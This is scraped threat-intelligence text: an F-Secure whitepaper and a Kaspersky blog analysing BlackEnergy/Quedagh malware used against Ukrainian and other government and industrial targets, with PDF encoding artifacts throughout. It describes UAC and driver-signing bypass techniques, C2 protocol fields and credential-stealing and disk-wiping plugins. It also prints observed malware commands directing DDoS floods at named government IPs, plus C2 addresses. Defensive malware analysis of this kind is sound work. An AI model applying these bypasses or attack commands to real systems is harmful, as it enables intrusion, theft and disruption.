Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages\", 'Report Double Dragon: APT41, a Dual Espionage and Cyber Crime Operation\\nYour browser is a bit outdated.\\nUpdate it for the best content experience.\\nClose'\n",

      "'BLACKENERGY & QUEDAGH The convergence of crimeware and APT attacks CONTENTSIntroduction 2Attack overview 2Infection vectors 3Target details 42008 cyberattacks on Georgia? 4Ukraine-related proxies 4Timeline 6Technical details 8UAC bypass during installation 8Driver signing policy bypass 8Hijacking existing drivers 9Driver component 9Main DLL component 10BlackEnergy 3 10Information-stealing plugin 11Network tra˜c 12Conclusions 13 Appendix A | Samples 14 BlackEnergy is a toolkit that has been used for years by various criminal out˚ts. In the summer of 2014, we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting. These samples were identi˚ed as being the work of one group, referred to in this document as ﬁ Quedagh ﬂ, which has a history of targeting political organizations. The Quedagh-related customizations to the BlackEnergy malware include support for proxy servers and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems. While monitoring BlackEnergy samples, we also uncovered a new variant used by this group. We named this new variant BlackEnergy 3 .The use of BlackEnergy for a politically-oriented attack is an intriguing convergence of criminal activity and espionage. As the kit is being used by multiple groups, it provides a greater measure of plausible deniability than is a˛orded by a custom- made piece of code. TLP: WHITEF˜SECURE LABS SECURITY RESPONSE Malware Analysis Whitepaper 2INTRODUCTION BlackEnergy is a popular crimeware (that is, malware designed to automate criminal activities) that is sold in the Russian cyber underground and dates back to as early as 2007. Originally, it was designed as a toolkit for creating botnets for use in conducting Distributed Denial of Service (DDoS) attacks. Over time, the malware has evolved to support di˛erent plugins, which are used to extend its capabilities to provide necessary functions, depending on the purpose of an attack. Given the nature of its toolkit, BlackEnergy has unsurprisingly been used by di˛erent gangs for di˛erent purposes; some use it for sending spam, others for stealing banking credentials. The most notorious use may be when it was used to conduct cyberattacks against Georgia during the Russo-Georgian confrontation in 2008. In the summer of 2014, BlackEnergy caught our attention when we noticed that samples of it were now tailored to target Ukrainian government institutions. Though it may be unrelated, it is interesting to note that this change conveniently coincides with the on-going crisis in that country. Related or not, one thing is certain: the actor(s) using these customized BlackEnergy malware are intent on stealing information from the targets. The use of this crimeware in what constitutes as an advance persistent threat (APT) attack is interesting. In ‚black operations™ (black ops), an important criteria is that the attack should not be attributable - and what provides better plausible deniability than crimeware known to be used by multiple parties? In this paper we focus only on BlackEnergy samples known to be used speci˚cally by the actors we identify as Quedagh , who seem to have a particular interest in political targets. Special focus will be on the samples that were used in targeted attacks against Ukrainian government organizations earlier this year. ATTACK OVERVIEW At the time of writing, we have little information on how exactly victims are receiving the BlackEnergy malware being pushed by the Quedagh gang. An educated guess is that they are receiving the malware via targeted emails containing malicious attachments. Meanwhile, the following infection and technical details are based on samples gathered after searching through F-Secure Labs™ collection of all BlackEnergy samples and identifying those with Quedagh characteristics. Figure 1: BlackEnergy Builder from 2007 The BlackEnergy toolkit comes with a builder application which is used to generate the clients that the attacker(s) use to infect victim machines. The toolkit also comes with server-side scripts, which the attackers set up in the command and control (C&C) server. The scripts also provide an interface where an attacker can control his bots. The simplicity and convenience provided by the toolkit means that anyone who has access to the kit can build his own botnet without any skills required. 3Some earlier installer variants, then named regedt32. exe, were distributed by documents exploiting software vulnerabilities, one of which was CVE-2010-3333. These documents drop and execute the installer, then open a decoy document. It is reasonable to assume that a similar approach has been used to deliver the more recent installer variants.The installer ˚lename of BlackEnergy 3 is still msiexec.exe . However, it is delivered and executed by a dropper which opens a decoy document in the foreground. We also encountered a standalone, non-persistent sample that pretends to be Adobe Flash Player Installer. It does not use any decoy document or application and does not run after reboot. The overview below summarizes the various infection vectors used by the Quedagh gang to deliver BlackEnergy crimeware to the designated targets. OVERVIEW OF INFECTION VECTORS USED AGAINST UKRAINIAN TARGETS APPmsiexec.exe msiexec.exe msiexec.exe INSTALLER INSTALLER INSTALLER PERSISTENT component PERSISTENT component PERSISTENT component NON˜PERSISTENT component Trojanized appExploit document Dropper malware Fake installerThe original BlackEnergy toolkit ˚rst emerged in 2007 and is referred to in this paper as BlackEnergy 1. A later variant of the toolkit (BlackEnergy 2) was released in 2010. We also encountered a previously unseen variant, which had been rewritten and uses a di˛erent format for its con˚guration. It also no longer uses a driver component. We dubbed this new variant BlackEnergy 3 . INFECTION VECTORS Most of the recent BlackEnergy installers collected are named msiexec.exe . We believe they are either dropped by another executable that uses social engineering tricks to mislead the user into executing the installer, or by documents containing exploits that silently perform the installation.We found at least 2 trojanized legitimate applications that execute the installer (in addition to their legitimate tasks). Trojanization is an e˛ective infection method, as most users have no way of observing that a malicious component is being installed in tandem with a legitimate program. 4Image 2: Decoy document circa 2012 Image 3: Strings from a sample circa 2012 TARGET DETAILS From the very earliest variants we were able to attribute to Quedagh, we have noticed that their targets have been political in nature. Apart from other indicators, we can deduce the nature of the target based on the content of social engineering tactics used to distribute the installers. For example, one decoy dropped from a sample dating to 2012 (image 2 ) seems to be targeting European audiences and discusses a political/economic situation. Strings found in another sample from 2012 ( image 3 ) again indicate a political motivation behind the attack. Most decoys used content taken from news sites; we noted one decoy dropped by an exploit document was created using the Russian version of O˜ce ( image 4 ).The latest variant of the dropper pretends to be a document ˚le with a Ukrainian ˚lename ( image 5 ). The choice of language for the ˚lename again may tie in or reference the current political crisis in that country. The ˚lename itself means ‚password list™ in English. 2008 CYBERATTACKS ON GEORGIA? During our investigation, we found interesting details that lead us to suspect that Quedagh might have been involved in the cyberattacks launched against Georgia during the 2008 Russo-Georgian confrontation. While the details identi˚ed are suggestive, they are not conclusive; they do however seem consistent with the group™s involvement in subsequent targeted attacks. UKRAINE˜RELATED PROXIES While examining the samples collected during our BlackEnergy monitoring, we noticed that samples from this year had been updated to support the use of proxy servers while connecting to their C&C servers. This contrasts with earlier BlackEnergy 2 variants, which do not support proxy servers. In some network setups, a proxy server is needed to allow internal users to access the Internet 1. BlackEnergy¹s use of a proxy server may indicate that the gang has prior knowledge of the target organization™s internal setup to note of this requirement. For example, in one sample the con˚guration uses the proxy server associated with the Ukrainian Railway (image 6 ). The con˚guration from another sample also shows it using an internal proxy under the giknpc domain (image 7 ). The domain giknpc.com.ua in turn hosts 3 domains (image 8 ), one of which is for the city of Dnipropetrovsk ( image 9 ), the fourth-largest city in Ukraine, located in the southeast. Based on the set proxy servers for the di˛erent samples, we concluded that the gang is targeting Ukrainian government organizations. 5Image 5: 2014 dropper sample disguised as a document.

Initially, the group seemed to prefer to use the ˚lename of the Windows registry editor (regedt32.exe), presumably because the installer needs administrator rights to install its driver component and therefore would try to request for the highest available rights ( image 10 ), if possible. As this triggers a noti˚cation message visible to the user, said user is more likely to grant permission if it appears to be the registry editor that is requesting for permission, since it is normal to run it with administrator rights. Experienced users though are less likely to be taken in, thereby decreasing the likelihood of a successful infection. Starting April 2013, modi˚ed installers appeared showing that the Quedagh group found a way to bypass the default User Account Control (UAC) settings. With this change, the user™s permission is no longer need ( image 11 ). At this point, the gang also began to use the Windows installer program ˚lename msiexec.exe .64-bit support Within a month of Windows 8.1™s release, the gang had quickly added support for 64-bit systems, possibly anticipating that more of their target systems will be migrated to 64-bit systems. They also employ a neat trick to bypass the driver signing requirement on 64- bit Windows systems. As a side note, this latest ˚nding updates and supercedes previously published research related to BlackEnergy™s driver signing behavior 2. However, this trick doesn™t work on Windows 8 and later systems. The driver also crashes occassionally. This could be the reason for the stand-alone non-persistent BlackEnergy variant. BlackEnergy 3 We identi˚ed the new BlackEnergy 3 variant ˚rst by the change in its con˚guration, which di˛ered from those of its two predecessors, 1 and 2 ( images 12 to 14 ). It also no longer uses a driver component 3. Further technical details are documented on page 10 to 11.

If not, it will re-launch itself as Administrator on Vista. This in e˛ect will trigger a UAC prompt. On Windows 7 and later however, the malware will attempt to bypass the default UAC settings. It exploits a backward-compatibility feature found in newer versions of Windows. BlackEnergy installers include a Shim Database, or a ﬁ˚xﬂ, instructing SndVol.exe to execute cmd.exe (image 15, below) instead in order to resolve the incompatibility. SndVol.exe is one of the Windows executables that will be automatically elevated upon execution because it is thought to be safe. What harm can a volume control cause? With the malicious ﬁ˚xﬂ installed however, executing SndVol.exe will execute the not-so-safe ˚le cmd.exe instead, which can then be used to install the malware while in an elevated state. DRIVER SIGNING POLICY BYPASS The role of the installer is to set up the malware™s persistent component, which is the driver component. On 64-bit Windows systems, Microsoft has enforced a policy that requires all drivers to be signed as a security precaution. Signing provides a way to identify a driver to its author, e˛ectively reducing the number of malware developers willing to take the risk. To allow developers to test their drivers during development, Microsoft provides a TESTSIGNING boot con˚guration option; while in this mode, a watermark is displayed on the screen to make it obvious to users and to prevent malware from exploiting this option.BlackEnergy enables the TESTSIGNING option to load its driver component; to hide this change from the user, the malware removes the watermark by removing the relevant strings in the user32.dll.mui of the system. In Windows 8 and up however, the strings are no longer stored in user32.dll.mui , so the trick will not work. This may be one of the reasons for the existence of a standalone non- persistent BlackEnergy variant. The malware does not infect 64-bit Windows systems that are older than Vista. Image 15: Malicious ˚x to redirect SndVol.exe to cmd.exe. Inset: Test Mode watermark 9HIJACKING EXISTING DRIVERS The installer will try to locate an existing driver service that is inactive. The service found will usually be a legitimate one that is disabled because it is no longer used or because it is set to start only on demand. The installer will drop the driver component using the corresponding path of the service. It will overwrite the existing driver if necessary. The hijacked service is then set to start automatically. This is how the malware is able to survive after a reboot. By doing this, the gang may be hoping that their malicious driver will be overlooked by administrators or investigators who are so used to seeing those legitimate services. DRIVER COMPONENT The only component that will remain permanently on the infected system will be the driver component. The driver component used by the gang is a stripped down version of the BlackEnergy 2 driver. The sole purpose of this driver component is to inject the main DLL component into svchost.exe . Interestingly, it does not contain the rootkit functionalities for hiding processes, ˚les and registry objects that is found in the usual BlackEnergy 2 drivers. The gang may have opted for a ‚hide in plain sight™ approach to evade detections from rootkit scanners, such as GMER and RootkitRevealer, that checks for system anomalies. The driver component provides a IOCTL interface to communicate with the main DLL component. Table 1 (above) summarizes the command codes that can be passed to the IOCTL bu˛er. The 32-bit version contains additional, incomplete routines for hiding processes via direct kernel object manipulation (DKOM) and managing BlackEnergy 2 rootkit rules in memory 2.

Table 2 (above) summarizes the di˛erences between the driver component used by Quedagh compared to the typical BlackEnergy 2. MAIN DLL COMPONENT The core functionality of BlackEnergy 2 is found in the main DLL component. This component is embedded inside the driver component and is not found in the ˚le system; this is to reduce the infection footprint on the system. The main DLL provides a robust framework for attackers to maintain a botnet that is not tied to any speci˚c functionality. The malware is designed to be used by loading customized plugins depending on the purpose of the botmaster. It is mainly a framework for plugins to communicate with a central command and control. Otherwise, the main DLL only provides a minimal set of commands. Table 3 (above) summarizes the commands supported by the variants used in the attack against Ukrainian government organizations. In BlackEnergy 2, the main DLL component communicates with its plugins via a de˚ned set of API calls. It exports a number of function calls, which can be used by the plugins. On the other hand, plugins are required to export 2 functions to work. We highly recommend the research of Dell SecureWorks for those looking for more details regarding the BlackEnergy 2 plugin framework. BLACKENERGY 3 In contrast to previous variants, BlackEnergy 3 uses a simpler installer component. It does not have a driver component and the installer drops the main DLL component directly to the local application data (non- roaming) folder. The installer then creates a LNK ˚le in the startup folder, using a ˚lename generated based on the volume serial number as a launch point. The LNK ˚le is a shortcut to execute the main DLL using rundll32.exe .Command Description rexec Download and execute a binary lexec Execute a shell command dieUninstallgetpl Load a plugin turno˝Quit (will start again after reboot) chprt Add / remove / set active command and control server Typical BlackEnergy 2 Quedagh BlackEnergy 2 Launch Point Creates a new service based on either a hardcoded or randomly generated name (depending on the installer) Hijacks an existing legitimate service Role Hides processes, ˚les and registry objects; Inject main DLL to svchost.exe Injects main DLL to svchost.exe Versions 32-bit driver component that contains complete routines in its IOCTL interface 32-bit driver component with a lot of remnant routines in its IOCTL interface, only a few of which make sense. After Nov 11, 2013, the 64-bit driver component is available and provides limited functionalities in IOCTL interface (only those equivalent working routines found in the 32-bit versions) TABLE 2: TYPICAL BLACKENERGY DRIVER COMPONENT VERSUS QUEDAGH™S CUSTOM COMPONENT TABLE 3: COMMANDS SUPPORTED BY VARIANTS TARGETED AT UKRAINIAN ENTITIES TABLE 4: X509_ASN FIELDS & EQUIVALENT BLACKENERGY 2 XML NODE 11IDBlackEnergy 2 Node Description 1servers The command and control servers 2pluginsPlugins to be loaded 3cmdsCommands to be executed 4build idBuild ID5sleepfreq Phone home interval Command Description delete UninstallldplgLoad a plugin unlplgUnload a pluginupdate Update main DLL dexec Download and execute an executable exec Download and execute a binary updcfg Update the con˚guration data This variant uses a new con˚guration format. The con˚guration data is a series of X509_ASN encoded values and are accessed by an ID number. Table 4 summarizes the ˚elds and their equivalent BlackEnergy 2 XML node, while table 5 lists the completely new set of commands used in this latest variant. BlackEnergy 3 also uses a di˛erent method of communication with its plugins, as it now communicates via RPC over the named-pipe protocol (ncacn_np). INFORMATION˜STEALING PLUGIN Since the main DLL component o˛ers little clue as to what the malware was used for, we need to look at the plugin to determine the objective of the gang. One particular plugin that was used in the campaign was called ﬁsiﬂ, perhaps to mean ‚steal information™. The latest sample we found will attempt to gather the following information and send them to the C&C server: System con˚guration information (gathered via systeminfo.exe) Operating system version Privileges Current time Up time Idle Time Proxy Installed apps (gathered from uninstall program registry) Process list (gathered via tasklist.exe) IP con˚gurations (gathered via ipcon˚g.exe) Network connections (gathered via netstat.exe) Routing tables (gathered via route.exe) Traceroute and Ping information to Google (gathered via tracert.exe and ping.exe) Registered mail, browser, and instant messaging clients (gathered via client registry) Account and password information from The Bat! email client (gathered from account.cfn and account.cfg) Stored username and passwords in Mozilla password manager of the following applications (gathered from signons*.txt and signons.sqlite) Thunderbird Firefox SeaMonkey IceDragon Stored username and passwords in Google Chrome password manager of the following applications (gathered from ﬁLogin Dataﬂ) Google Chrome Chromium Comodo Dragon Xpom Nichrome QIP Surf Torch YandexBrowser Opera Sleipnir Account and password information from Outlook and Outlook Express Internet Explorer version and stored username and passwords Stored username and passwords in Windows Credential Store Live Remote Desktop Other generic credentials (Microsoft_ WinInet_*) The nature of the information being gathered seems to be generic rather than targeted. This may be because the malware has roots from crimeware. The information is still useful however as such data makes it easier for the gang to plan any further attacks on the same targets. TABLE 4: X509_ASN FIELDS & EQUIVALENT BLACKENERGY 2 XML NODE TABLE 5: BLACKENERGY 3 COMMANDS 12NETWORK TRAFFIC BlackEnergy communicates with its C&C server via HTTP POST requests. For the BlackEnergy 2 samples used by the gang, the request contains the following ˚elds: id=bot_id&bid=base64_encoded_build_ id&dv=x&mv=y&dpv=z Where: bot_id is equivalent to the infected host name and the volume serial number following the format xhost_name_serial_no (e.g. xJOE- PC_484DA98A) build_id is the string found in the build_id ˚eld in the sample™s con˚guration data x, y, z are hardcoded values which varies among samples The ˚elds are almost the same for BlackEnergy 3 samples: id=bot_id_sha1&bid=base64_encoded_build_ id&nm=x&cn=y&num=z The only major di˛erence is that the id ˚eld contain just the hash instead of the actual string. The actual bot_id string in which the id hash is derived is also a bit di˛erent; it now uses the format domain_sid_host_name_ serial_no .The response of the command and control server will be encrypted using the id ˚eld in the POST request as the key. After the response is decrypted, it will be in the form of the corresponding con˚guration data of the BlackEnergy sample; for example, BlackEnergy 2 samples expect the decrypted response to be a XML document, while BlackEnergy 3 samples expect the decrypted response to be a series X509_ASN encoded values. The decrypted response, which is equivalent to another con˚guration data, will be processed similar to the initial con˚guration data embedded in the main DLL; the only di˛erences are the data ˚elds that are processed. This cycle is illustrated in diagram 3 (above). The main DLL also uses the ˚elds listed in table 6 (above) when it needs to download additional ˚les. HTTP POST Field Description of Values getp The plugin name to be downloaded plvSome variants specify the version of the plugin to be downloaded getpd The binary name to be downloaded TABLE 6: MAIN DLL™S ADDITIONAL COMMANDS DURING DOWNLOAD OF ADDITIONAL FILES DIAGRAM 3: CONFIGURATION DATA HANDLING MAIN DLL Con˚g Con˚g C&C SERVER HTTP POST 123123Main DLL process con˚guration data embedded in its body; will only process ˚elds related to C&C communication. BlackEnergy 2 con˚guration may also contain initial commands to execute. Main DLL reports to C&C. Main DLL processes the con˚guration data returned by the C&C. This time, it processes ˚elds related to plugins and commands. 13CONCLUSIONS BlackEnergy is a toolkit that has been used for years by various criminal out˚ts. In the summer of 2014, we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting. These samples were identi˚ed as being the work of one group, referred to in this document as ﬁQuedagh ﬂ, which has a history of targeting political organizations. Though inconclusive, suggestive details indicate that BlackEnergy malware, possibly also from this gang, may also have been used in the Russo-Georgian confrontation in 2008. The Quedagh-customizations to the BlackEnergy malware include support for proxy servers (which, in the samples examined are associated with Ukrainian entities) and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems. While monitoring BlackEnergy samples, we also encountered a new variant, which we dub BlackEnergy 3 , with a modi˚ed con˚guration, no driver component and a di˛erent installation procedure. The use of BlackEnergy for a politically-oriented attack is an intriguing convergence of criminal activity and espionage. As the kit is being used by multiple groups, it provides a greater measure of plausible deniability than is a˛orded by a custom-made piece of code. .REFERENCES 1.

plugins, router abuse, and target profiles\\nNew observations on BlackEnergy2 APT activity\\nBy Kurt Baumgartner, Maria Garnaeva\\non November 3, 2014. 7:58 am\\nThe BlackEnergy malware is crimeware turned APT tool and is used in significant geopolitical operations lightly documented over the past year. An even more interesting part of the BlackEnergy story is the relatively unknown custom plugin capabilities to attack ARM and MIPS platforms, scripts for Cisco network devices, destructive plugins, a certificate stealer and more. Here,\\xa0we present available data – it is difficult to collect on this APT.\\xa0We will also present more details on targets previously unavailable and present related victim profile data.\\nThese attackers are careful to hide and defend their long-term presence within compromised environments. The malware’s previously undescribed breadth means attackers present new technical challenges in unusual environments, including SCADA networks. Challenges, like mitigating the attackers’ lateral movement across compromised network routers, may take an organization’s defenders far beyond their standard routine and out of their comfort zone.\\nBrief History\\nBlackEnergy2 and BlackEnergy3 are known tools. Initially, cybercriminals used BlackEnergy custom plugins for launching DDoS attacks. There are no indications of how many groups possess this tool. BlackEnergy2 was eventually seen downloading more crimeware plugins – a custom spam plugin and a banking information stealer custom plugin. Over time, BlackEnergy2 was assumed into the toolset of the BE2/Sandworm actor. While another crimeware group continues to use BlackEnergy to launch DDoS attacks, the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and included custom plugins and scripts of their own. To be clear, our name for this actor has been the BE2 APT, while it has been called “Sandworm Team” also.\\nThe Plugins and Config Files\\nBefore evidence of BlackEnergy2 use in targeted attacks was uncovered, we tracked strange activity on one of the BlackEnergy CnC servers in 2013. This strangeness\\xa0was related to values listed in newer\\xa0BlackEnergy configuration files. As described in Dmitry’s 2010 Black DDoS’ analysis, a configuration file is downloaded from the server by main.dll on an infected system. The config file provides download instructions for the loader. It also instructs the loader to pass certain commands to the plugins. In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing. Displayed below are these new, xml formatted plugin names “weap_hwi”, “ps”, and “vsnet” in a BlackEnergy configuration file download from a c2 server. This new module push must have been among the first for this group, because all of the module versions were listed as “version 1”, including the ddos plugin:\\nConfig downloaded from BE2 server\\nThe ‘ps’ plugin turned out to be password stealer. The ‘vsnet’ plugin was intended to spread and launch a payload (BlackEnergy2 dropper itself at the moment) in the local network by using PsExec, as well as gaining primary information on the user’s computer and network.\\nMost surprising was the ‘weap_hwi’ plugin. It was a ddos tool compiled to run on ARM systems:\\nWeap_hwi plugin\\nAt first, we didn’t know whether the ARM plugin was listed intentionally or by mistake, so we proceeded to collect the CnC’s config files. After pulling multiple config files, we confirmed that this ARM object inclusion was not a\\xa0one-off mistake. The server definitely delivered config files not only for Windows, but also for the ARM/MIPS platform. Though unusual,\\xa0the ARM module was delivered by the same server and it processed the same config file.\\nLinux plugins\\nOver time we were able to collect several plugins as well as the main module for ARM and MIPS architectures. All of these ARM/MIPS object files were compiled from the same source and later pushed out in one config: “weap_msl”, “weap_mps”, “nm_hwi”, “nm_mps”, “weap_hwi”, and “nm_msl”. It’s interesting that the BE2 developers upgraded the ddos plugin to version 2, along with the nm_hwi, nm_mps, and nm_msl plugins. They\\xa0simultaneously released version 5 of the weap_msl, weap_mps, and weap_hmi plugins. Those assignments were not likely arbitrary, as this group had developed BlackEnergy2 for several years in a professional and organized style:\\nConfig with a similar set of plugins for different architectures\\nHere is the list of retrieved files and related functionality:\\nweap\\nDDoS Attack (various types)\\nps\\npassword stealer handling a variety of network protocols (SMTP, POP3, IMAP, HTTP, FTP, Telnet)\\nnm\\nscans ports, stores banners\\nsnif\\nlogs IP source and destination, TCP/UDP ports\\nhook\\nmain module: CnC communication, config parser, plugins loader\\nuper\\nrewrites hook module with a new version and launches it\\nWeap, Snif, Nm plugin grammar mistakes and mis-spellings\\nThe developers’ coding style differed across the ‘Hook’ main module, the plugins, and the Windows main.dll. The hook main module contained encrypted strings and handled all the function calls and strings as the references in a large structure. This structure obfuscation may be a rewrite effort to better modularize the code, but could also\\xa0be intended to complicate analysis. Regardless, it is likely that different individuals coded the different plugins. So, the BE2 effort must have its own small team of plugin and multiplatform developers.\\nHook module structure\\nAfter decrypting the strings, it became clear that the Linux Hook main module communicated with the same CnC server as other Windows modules:\\nThe CNC’s IP address in the Linux module\\nThis Linux module can process the following commands, some of which are similar to the Windows version:\\ndie\\ndelete all BlackEnergy2 files and system traces\\nkill\\ndelete all BlackEnergy2 files and system traces and reboot\\nlexec\\nlaunch a command using bin/sh\\nrexec\\ndownload and launch file using ‘fork/exec’\\nupdate\\nrewrite self file\\nmigrate\\nupdate the CnC server\\nWindows Plugins\\nAfter the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid greater\\xa0attention to new BE2 samples and associated CnCs.\\nDuring an extended period, we were able to collect many Windows plugins from different CnC servers, without\\xa0ever noticing Linux plugins being downloaded as\\xa0described above. It appears the\\xa0BE2/SandWorm gang protected their servers by keeping their non-Windows hacker tools and plugins in separate servers or server folders. Finally, each CnC server hosts a different set of plugins, meaning that each server works with different victims and uses plugins based on its current needs. Here is the summary list of all known plugins at the moment:\\nfs\\nsearches for given file types, gets primary system and network information\\nps\\npassword stealer from various sources\\nss\\nmakes screenshots\\nvsnet\\nspreads payload in the local network\\xa0 (uses psexec, accesses admin shares), gets primary system and network information\\nrd\\nremote desktop\\nscan\\nscans ports of a given host\\ngrc\\nbackup channel via plus.google.com\\njn\\nfile infector (local, shares, removable devices) with the given payload downloaded from CnC\\ncert\\ncertificate stealer\\nsn\\nlogs traffic, extracts login-passwords from different protocol (HTTP, LDAP, FTP, POP3, IMAP, Telnet )\\ntv\\nsets password hash in the registry for TeamViewer\\nprx\\nProxy server\\ndstr\\nDestroys hard disk by overwriting with random data (on application level and driver level) at a certain time\\nkl\\nkeylogger\\nupd\\nBE2 service file updater\\nusb\\ngathers information on connected USBs\\xa0 (Device instance ID,\\xa0 drive geometry)\\nbios\\ngathers information on BIOS, motherboard, processor, \\xa0OS\\nWe are pretty sure that our\\xa0list of BE2 tools is not complete. For example, we have yet to\\xa0obtain the router access plugin, but we are confident that it exists. Evidence also supports the hypothesis that there is a encryption plugin for victim files (see below).\\nOur current collection represents the BE2 attackers’ capabilities quite well. Some plugins remain\\xa0mysterious and their purpose is not yet\\xa0clear, like ‘usb’ and ‘bios’. Why would the attackers need information on usb and bios characteristics? It suggests that based on a specific USB and BIOS devices, the attackers may upload specific\\xa0plugins to carry out additional actions. Perhaps destructive, perhaps to further infect devices. We don’t know yet.\\nIt’s also interesting to point out another plugin – ‘grc’. In some of the BE2 configuration files, we can notice an value with a “gid” type:\\nThe addr number in the config\\nThis number is an ID for the plus.google.com service and is used by the ‘grc’ plugin to parse html. It then downloads and decrypts a PNG file. The decrypted PNG is supposed to contain a new config file, but we never observed one. We are aware of two related GooglePlus IDs. The first one, plus.google.com/115125387226417117030/, contains an abnormal number of views. At the time of writing, the count is 75 million:\\nBE2 plus profile\\nThe second one – plus.google.com/116769597454024178039/posts – is currently more modest at a little over 5,000 views. All of that account’s posts are deleted.\\nTracked Commands\\nDuring observation of the described above “router-PC” CnC we tracked the following commands delivered in the config file before the server went offline. Our observation of related\\xa0actions\\xa0here:\\nu ps\\nstart password stealing (Windows)\\nPs_mps/ps_hwi start\\nstart password stealing (Linux, MIPS,\\xa0 ARM)\\nuper_mps/uper_hwi start\\nrewrite hook module with a new version and launch it (Linux, MIPS, ARM)\\nNm_mps/nm_hwi start\\xa0 –ban -middle\\nScan ports and retrieve banners on the router\\xa0subnet\\xa0 (Linux, MIPS,\\xa0 ARM)\\nU fsget * 7 *.docx, *.pdf, *.doc *\\nsearch for docs with the given filetypes (Windows)\\nS sinfo\\nretrieve information on installed programs and launch commands:\\nsysteminfo, tasklist, ipconfig, netstat, route print, tracert www.google.com (Windows)\\nweap_mps/weap_hwi host188.128.123.52 port25,26,110,465,995\\xa0 typetcpconnect\\nDDoS on 188.128.123.52 (Linux, MIPS,\\xa0 ARM)\\nweap_mps/weap_hwi\\xa0 typesynflood port80 cnt100000 spdmedium host212.175.109.10\\nDDoS on 212.175.109.10 (Linux, MIPS,\\xa0 ARM)\\nThe issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM devices.\\xa0We want to pay special attention to the DDoS commands meant for these routers. 188.128.123.52 belongs to the Russian Ministry of Defense and 212.175.109.10 belongs to the Turkish Ministry of Interior’s government site. While many researchers suspect a Russian actor is behind BE2, judging by their tracked activities and the victim profiles, it’s still unclear whose interests they represent.\\nWhile observing some other CnCs and pulling down config files, we stumbled upon some strange mistakes and mis-typing. They are highlighted in the image below:\\nBE2 config file mistakes\\nFirst, these mistakes suggest that the BE2 attackers manually edit these config files. Secondly, it shows that\\xa0even skilled hackers make mistakes.\\nHard-Coded Command and Control\\nThe contents of the config files themselves are fairly interesting. They all contain a callback c2 with a hardcoded ip address, contain timeouts, and some contain the commands listed above. We include a list of observed\\xa0hardcoded ip C2 addresses here, along with the address owner and geophysical location of the host:\\nC2 IP address\\nOwner\\nCountry\\n184.22.205.194\\nhostnoc.net\\nUS\\n5.79.80.166\\nLeaseweb\\nNL\\n46.165.222.28\\nLeaseweb\\nNL\\n95.211.122.36\\nLeaseweb\\nNL\\n46.165.222.101\\nLeaseweb\\nNL\\n46.165.222.6\\nLeaseweb\\nNL\\n89.149.223.205\\nLeaseweb\\nNL\\n85.17.94.134\\nLeaseweb\\nNL\\n46.4.28.218\\nHetzner\\nDE\\n78.46.40.239\\nHetzner\\nDE\\n95.143.193.182\\nServerconnect\\nSE\\n188.227.176.74\\nRedstation\\nGB\\n93.170.127.100\\nNadym\\nRU\\n37.220.34.56\\nYisp\\nNL\\n194.28.172.58\\nBesthosting.ua\\nUA\\n124.217.253.10\\nPIRADIUS\\nMY\\n84.19.161.123\\nKeyweb\\nDE\\n109.236.88.12\\nworldstream.nl\\nNL\\n212.124.110.62\\ndigitalone.com\\nUS\\n5.61.38.31\\n3nt.com\\nDE\\n5.255.87.39\\nserverius.com\\nNL\\nIt’s interesting that one of these servers is a Tor exit node. And, according to the collected config files, the group upgraded their malware communications\\xa0from plain text http to encrypted https in\\xa0October 2013.\\nBE2 Targets and Victims\\nBlackEnergy2 victims are widely distributed geographically. We identified BlackEnergy2 targets and victims in the following countries starting in late 2013. There are likely more victims.\\nRussia\\nUkraine\\nPoland\\nLithuania\\nBelarus\\nAzerbaijan\\nKyrgyzstan\\nKazakhstan\\nIran\\nIsrael\\nTurkey\\nLibya\\nKuwait\\nTaiwan\\nVietnam\\nIndia\\nCroatia\\nGermany\\nBelgium\\nSweden\\nVictim profiles point to an expansive interest in ICS:\\npower generation site owners\\npower facilities construction\\npower generation operators\\nlarge suppliers and manufacturers of heavy power related materials\\ninvestors\\nHowever, we also noticed that\\xa0the target list includes government, property holding, and technology organizations as well:\\nhigh level government\\nother ICS construction\\nfederal land holding agencies\\nmunicipal offices\\nfederal emergency services\\nspace and earth measurement and assessment labs\\nnational standards body\\nbanks\\nhigh-tech\\xa0transportation\\nacademic research\\nVictim cases\\nWe gained insight into significant BE2 victim profiles over the summer of 2014. Interesting\\xa0BE2 incidents are presented here.\\nVictim #1\\nThe BE2 attackers successfully spearphished an organization with an exploit for which there is no current CVE, and a metasploit module has been available This email message contained a ZIP archive with EXE file inside that did not appear to be an executable. This crafted zip archive exploited a WinRAR flaw that makes files in zip archives appear to have a different name and file extension.\\nBE2 spearphish example\\nThe attached exe file turned out to be ‘BlackEnergy-like’ malware, which researchers already dubbed ‘BlackEnergy3’ – the gang uses it along with BlackEnergy2. Kaspersky Lab detects ‘BlackEnergy3’ malware as Backdoor.Win32.Fonten – naming it after its dropped file “FONTCACHE.DAT”\\nWhen investigating computers in the company’s network, only BE2 associated files were found, suggesting BE3 was used as only a first-stage tool on this network. The config files within BE2 contained the settings of the company’s internal web proxy:\\nBE2 config file contains victim’s internal proxy\\nAs the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in older versions – all plugins were only in-memory), the administrators were able to collect BE2 files from the infected machines. After decrypting these files, we could retrieve plugins launched on infected machines: ps, vsnet, fs, ss, dstr.\\nBy all appearances, the attackers pushed the ‘dstr’ module when they understood that they were revealed, and wanted to hide their presence on the machines. Some machines already launched the plugin, lost their data and became unbootable.\\nDestructive dstr command in BE2 